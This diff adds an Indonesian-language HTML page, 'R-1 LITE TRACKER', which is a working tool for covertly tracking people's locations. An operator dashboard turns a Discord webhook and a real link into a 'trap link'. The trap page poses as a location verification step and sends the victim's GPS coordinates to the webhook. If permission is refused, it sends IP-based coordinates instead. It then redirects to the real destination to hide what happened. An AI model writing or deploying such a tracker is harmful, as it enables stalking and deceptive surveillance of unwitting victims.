@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>R-1 LITE TRACKER</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #000; color: #fff; font-family: sans-serif; }
+        .r1-border { border: 1px solid #ff0000; }
+        .r1-btn { background: #ff0000; transition: 0.2s; }
+        .r1-btn:hover { background: #cc0000; box-shadow: 0 0 15px #ff0000; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <!-- MODE 1: TRAP (Halaman Jebakan) -->
+    <div id="trap-mode" class="hidden w-full max-w-sm bg-white text-black p-8 rounded-3xl shadow-2xl text-center">
+        <div id="verif-ui">
+            <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+            </div>
+            <h1 class="text-xl font-bold">Verifikasi Lokasi</h1>
+            <p class="text-sm text-gray-500 mt-2">Untuk melanjutkan ke konten, mohon izinkan akses lokasi untuk memverifikasi wilayah Anda.</p>
+            <button onclick="capture()" class="w-full mt-6 bg-blue-600 text-white font-bold py-4 rounded-xl active:scale-95 transition">Izinkan & Lanjutkan</button>
+        </div>
+        <div id="redirect-ui" class="hidden">
+            <div class="animate-spin h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full mx-auto"></div>
+            <p class="mt-4 font-bold">Mengalihkan dalam <span id="timer">5</span> detik...</p>
+        </div>
+    </div>
+
+    <!-- MODE 2: GENERATOR (Dashboard Kamu) -->
+    <div id="admin-mode" class="hidden w-full max-w-md bg-zinc-900 p-8 rounded-3xl r1-border shadow-2xl">
+        <h1 class="text-2xl font-black text-red-600 italic italic">R-1 LITE <span class="text-white">TRACKER</span></h1>
+        <p class="text-[10px] text-gray-500 mb-6 uppercase tracking-widest">Simple & Accurate Intelligence</p>
+
+        <div class="space-y-4">
+            <div>
+                <label class="text-[10px] text-gray-400 font-bold block mb-1">DISCORD WEBHOOK URL</label>
+                <input type="text" id="webhook" placeholder="Tempel Webhook Discord di sini" class="w-full bg-black border border-zinc-800 rounded-lg p-3 text-xs outline-none focus:border-red-600">
+            </div>
+            <div>
+                <label class="text-[10px] text-gray-400 font-bold block mb-1">LINK TUJUAN (ASLI)</label>
+                <input type="text" id="dest" placeholder="https://youtube.com/..." class="w-full bg-black border border-zinc-800 rounded-lg p-3 text-xs outline-none focus:border-red-600">
+            </div>
+            <button onclick="generate()" class="w-full r1-btn py-3 rounded-lg text-xs font-bold uppercase">Buat Link Jebakan</button>
+        </div>
+
+        <div id="result" class="mt-6 hidden">
+            <p class="text-[10px] text-red-500 font-bold mb-2">LINK SIAP DISEBAR:</p>
+            <div class="bg-black p-3 rounded border border-dashed border-red-600 flex items-center">
+                <code id="final-link" class="text-[10px] text-red-400 truncate flex-1"></code>
+                <button onclick="copy()" class="ml-2 text-gray-500">📋</button>
+            </div>
+        </div>
+        <p class="mt-6 text-[9px] text-gray-600 text-center italic">Pantau hasil pelacakan langsung di Discord kamu.</p>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+
+        // Cek Apakah ini Target atau Admin
+        if (params.has('t')) {
+            document.getElementById('trap-mode').classList.remove('hidden');
+            document.body.style.backgroundColor = "#f3f4f6";
+        } else {
+            document.getElementById('admin-mode').classList.remove('hidden');
+            document.getElementById('webhook').value = localStorage.getItem('r1_webhook') || '';
+        }
+
+        // FUNGSI ADMIN
+        function generate() {
+            const wh = document.getElementById('webhook').value;
+            const ds = document.getElementById('dest').value;
+            if(!wh || !ds) return alert("Isi semua data!");
+
+            localStorage.setItem('r1_webhook', wh);
+            const b64 = btoa(ds + "|" + wh);
+            const link = window.location.origin + window.location.pathname + "?t=" + b64;
+
+            document.getElementById('final-link').innerText = link;
+            document.getElementById('result').classList.remove('hidden');
+        }
+
+        function copy() {
+            navigator.clipboard.writeText(document.getElementById('final-link').innerText);
+            alert("Link disalin!");
+        }
+
+        // FUNGSI TRAP
+        async function capture() {
+            const data = atob(params.get('t')).split("|");
+            const dest = data[0];
+            const webhook = data[1];
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await sendData(webhook, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, "🔴 GPS ACCURATE");
+                    startRedirect(dest);
+                }, async () => {
+                    // Jika ditolak, ambil IP saja
+                    const res = await fetch('https://ipapi.co/json/');
+                    const ip = await res.json();
+                    await sendData(webhook, ip.latitude, ip.longitude, 0, "� IP BASED (ESTIMATED)");
+                    startRedirect(dest);
+                }, { enableHighAccuracy: true });
+            } else {
+                startRedirect(dest);
+            }
+        }
+
+        async function sendData(url, lat, lon, acc, type) {
+            const payload = {
+                embeds: [{
+                    title: "R-1 SIGNAL DETECTED",
+                    description: type,
+                    color: 16711680,
+                    fields: [
+                        { name: "Google Maps", value: `[Klik di sini](https://www.google.com/maps?q=${lat},${lon})` },
+                        { name: "Akurasi", value: acc + " meter" },
+                        { name: "Waktu", value: new Date().toLocaleString() }
+                    ],
+                    footer: { text: "Link Trackering By R-1" }
+                }]
+            };
+            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        }
+
+        function startRedirect(url) {
+            document.getElementById('verif-ui').classList.add('hidden');
+            document.getElementById('redirect-ui').classList.remove('hidden');
+            let c = 5;
+            setInterval(() => {
+                c--;
+                document.getElementById('timer').innerText = c;
+                if(c == 0) window.location.href = url;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
